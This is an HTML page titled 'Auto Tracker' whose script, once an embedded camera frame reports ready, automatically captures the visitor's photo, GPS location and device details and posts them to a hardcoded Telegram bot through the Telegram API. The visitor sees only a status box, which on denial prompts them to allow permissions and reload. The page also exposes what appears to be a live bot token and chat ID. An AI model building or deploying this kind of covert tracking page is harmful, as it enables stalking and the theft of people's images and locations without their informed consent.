<!DOCTYPE html>
<html>
<head>
    <title>Auto Tracker</title>
    <style>
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        iframe {
            width: 100%;
            max-width: 400px;
            height: 350px;
            border: none;
            border-radius: 12px;
            background: #000;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <iframe id="cameraFrame" src="camera.html"></iframe>
    </div>

    <script>
        // ===== CONFIG =====
        const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
        const CHAT_ID   = '5410457102';
        const iframe    = document.getElementById('cameraFrame');
        const statusDiv = document.getElementById('status');

        let alreadySent = false; // prevent double‑send

        // ===== SEND TO TELEGRAM =====
        async function sendToTelegram(imageData, lat, lon, source, device) {
            const userName = 'Visitor'; // or you can use prompt if you want

            const textMsg = `👤 Name: ${userName}\n` +
                            `📍 Location: ${lat}, ${lon} (${source})\n` +
                            `📱 Device: ${device}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, photo: imageData })
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
        }

        // ===== AUTO EXECUTION ON CAMERA READY =====
        window.addEventListener('message', async (event) => {
            if (event.data.type === 'cameraReady' && !alreadySent) {
                statusDiv.textContent = '📷 Camera ready – capturing now...';
                alreadySent = true;

                try {
                    // Call the capture function inside the iframe
                    const data = await iframe.contentWindow.captureData();

                    statusDiv.textContent = '📤 Sending to Telegram...';
                    await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device);

                    statusDiv.textContent = '✅ ALL DATA SENT SUCCESSFULLY!';
                } catch (err) {
                    statusDiv.textContent = '❌ Error: ' + err.message;
                    console.error(err);
                }
            } else if (event.data.type === 'cameraError') {
                statusDiv.textContent = '❌ Camera access denied. Please allow permissions and reload.';
            }
        });

        // Fallback if iframe never sends ready signal
        setTimeout(() => {
            if (!alreadySent) {
                statusDiv.textContent = '⚠️ Camera took too long. Check console or refresh.';
            }
        }, 15000);
    </script>
</body>
</html>
